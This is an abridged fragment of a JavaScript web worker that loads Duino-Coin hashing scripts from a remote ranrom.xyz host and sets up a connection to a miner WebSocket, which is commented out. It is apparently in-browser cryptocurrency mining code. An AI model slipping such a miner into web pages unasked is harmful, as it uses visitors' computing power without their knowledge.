...
importScripts("https://www.ranrom.xyz/assets/vendor/duinotize/hashers/hash-duco-s1.js")
importScripts("https://www.ranrom.xyz/assets/vendor/duinotize/hashers/hash-wasm.js")
...
onmessage = function(event) {
    if (event.data.startsWith("Start")) {
        ...
        function connect() {
            ...
            //var socket = new WebSocket("wss://miner.ranrom.xyz:443");
